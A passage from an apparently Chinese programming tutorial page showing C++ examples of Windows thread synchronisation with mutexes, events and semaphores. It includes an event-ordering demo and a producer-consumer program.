class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hMutex = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hMutex = <span class="built_in">CreateMutex</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,<span class="comment">//创建的线程，是不是第一个拥有者</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件解决互斥问题："><a href="#事件解决互斥问题：" class="headerlink" title="事件解决互斥问题："></a>事件解决互斥问题：</h4><p>需要是自动模式的事件</p><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> SetEvent</p><p> 事件，没有线程所有权的概念，任何线程都可以释放事件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">TRUE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件决定顺序"><a href="#事件决定顺序" class="headerlink" title="事件决定顺序"></a>事件决定顺序</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WifeProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始做饭吧&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">SetEvent</span>(g_hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">HusProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hEvent, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始吃饭吧&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = g_hEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">FALSE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, WifeProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, HusProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="信号量："><a href="#信号量：" class="headerlink" title="信号量："></a>信号量：</h4><p> 有信号数这么一个概念，只要信号数不为0，那么就处于激发态。WaitForSignaleObject函数对它的副作用是将信号数减1。</p><p> 最大信号数为1 的信号量，可以认为是一个事件，可以解决互斥问题。</p><p> 被保护的代码（代码访问了共享资源）放置在</p><p> WaitForSignalObject</p><p> ReleaseSemaphore</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,  <span class="comment">// SD</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LONG lInitialCount,                          <span class="comment">// initial count</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LONG lMaximumCount,                          <span class="comment">// maximum count</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                           <span class="comment">// object name</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">此函数可用来创建或打开一个信号量，先看参数说明：</span></span><br><span class="line"><span class="function"> lpSemaphoreAttributes：为信号量的属性，一般可以设置为<span class="literal">NULL</span></span></span><br><span class="line"><span class="function"> lInitialCount：信号量初始值，必须大于等于0，而且小于等于 lpMaximumCount，如果lInitialCount 的初始值为0，则该信号量默认为unsignal状态，如果lInitialCount的初始值大于0，则该信号量默认为signal状态，</span></span><br><span class="line"><span class="function"> lMaximumCount： 此值为设置信号量的最大值，必须大于0</span></span><br><span class="line"><span class="function">lpName：信号量的名字，长度不能超出MAX_PATH ，可设置为<span class="literal">NULL</span>，表示无名的信号量。当lpName不为空时，可创建有名的信号量，若当前信号量名与已存在的信号量的名字相同时，则该函数表示打开该信号量，这时参数lInitialCount 和 </span></span><br><span class="line"><span class="function">lMaximumCount 将被忽略。</span></span><br><span class="line"><span class="function">    函数调用成功返回信号量句柄。</span></span><br><span class="line"><span class="function">释放信号量函数：</span></span><br></pre></td></tr></table></figure><p>b. 对于共享资源有序的访问，也可以更关注于要有序。</p><p> 事件和信号量更适合解决有序的问题。因为他们不要求谁上锁，谁开锁。</p><p>用代码实现一个读文件线程，一个写文件线程，请实现先写后读，两个线程都结束之后，主线程结束。</p><p>这种没有过多线程同时访问的有顺序的问题，比较适合用事件来解决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hSemaphore = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(g_hSemaphore, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(g_hSemaphore, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">g_hSemaphore = <span class="built_in">CreateSemaphore</span>(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">hThread1 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多个信号数的信号量，比较适合解决多个线程之间有顺序需要协调的问题，最为经典的就是生产者消费者问题。</p><p>关键点有两个：</p><p> 1 必须有一个队列，可以有数量限制，也可以没有数量限制。我们考虑的是有数量限制的问题</p><p> 2 每一个生产者是一个线程，每一个消费者也是一个线程。队列满了，生产者需要等待。队列空了，消费者需要等待。</p><p>整个的问题是多线程并发时的协调问题。</p><p>生产者消费者问题，有两个操作</p><p>P：生产</p><p>V：消耗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line">HANDLE hSemaphoreFull = <span class="number">0</span>;</span><br><span class="line">HANDLE hSemaphoreEmpty = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutex = <span class="number">0</span>;</span><br><span class="line">HANDLE hMutexNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> g_nNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">class</span> 盖饭</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    盖饭(<span class="type">const</span> <span class="type">char</span> *szName, <span class="type">int</span> nNum) :<span class="built_in">m_Id</span>(nNum)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nSize = <span class="built_in">strlen</span>(szName) + <span class="number">1</span>;</span><br><span class="line">        m_szName = <span class="keyword">new</span> <span class="type">char</span>[nSize];</span><br><span class="line">        <span class="built_in">memset</span>(m_szName, <span class="number">0</span>, nSize);</span><br><span class="line">        <span class="built_in">strcpy_s</span>(m_szName, nSize, szName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetId</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_Id;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> * m_szName;</span><br><span class="line">    <span class="type">int</span> m_Id;</span><br><span class="line">&#125;;</span><br><span class="line">std::vector&lt;盖饭*&gt; g_盖饭表;</span><br><span class="line"><span class="type">int</span> Continue = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//生产者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">Creater</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> nTime = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者开始做饭,预计%dms\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, nTime);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutexNum, <span class="number">-1</span>);</span><br><span class="line">        g_nNum++;</span><br><span class="line">        盖饭* p = <span class="keyword">new</span> 盖饭(<span class="string">&quot;鱼香肉丝&quot;</span>, g_nNum);</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutexNum);</span><br><span class="line">        <span class="built_in">Sleep</span>(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d号生产者传菜,菜号为%d\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, p-&gt;<span class="built_in">GetId</span>());</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hSemaphoreEmpty, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, <span class="number">-1</span>);</span><br><span class="line">        g_盖饭表.<span class="built_in">push_back</span>(p);</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphoreFull, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//消费者回调函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">User</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span> (Continue)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hSemaphoreFull, <span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> nTime = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">Sleep</span>(nTime * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(hMutex, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;                              %d号消费者取走了%d号饭,耗时%dms\n&quot;</span>, (<span class="type">int</span>)lpThreadParameter, g_盖饭表[<span class="number">0</span>]-&gt;<span class="built_in">GetId</span>(), nTime);</span><br><span class="line">        g_盖饭表.<span class="built_in">erase</span>(g_盖饭表.<span class="built_in">begin</span>());</span><br><span class="line">        <span class="built_in">ReleaseMutex</span>(hMutex);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(hSemaphoreEmpty, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hSemaphoreFull = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hSemaphoreEmpty = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hMutex = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    hMutexNum = <span class="built_in">CreateMutex</span>(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hThread[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//9个生产者</span></span><br><span class="line">    hThread[<span class="number">0</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">2</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">3</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">4</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">5</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">6</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">7</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">8</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">9</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, Creater, (LPVOID)<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//4个消费者</span></span><br><span class="line">    hThread[<span class="number">10</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">11</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">12</span>] = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, User, (LPVOID)<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    hThread[<span class="number">13</span>] = <span class="built_in">CreateThread</span>(<span 